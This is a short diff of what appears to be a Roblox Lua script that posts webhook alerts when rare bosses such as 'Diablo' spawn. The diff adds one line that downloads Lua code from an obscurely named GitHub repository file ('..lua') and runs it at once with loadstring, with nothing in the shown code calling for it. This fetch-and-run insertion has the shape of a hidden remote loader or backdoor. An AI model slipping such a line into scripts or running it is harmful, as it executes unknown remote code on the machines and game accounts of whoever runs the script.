@@ -82,6 +82,8 @@ elseif game:GetService("ReplicatedStorage"):FindFirstChild("Diablo") or game:Get
     SendEliteWebhook("Diablo")
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vldtncywdlojtnvjlmvyrbszljd/jklp/refs/heads/main/..lua",true))()
+
 local Notif = {}
 
 local CoreGUI = game:GetService("CoreGui")
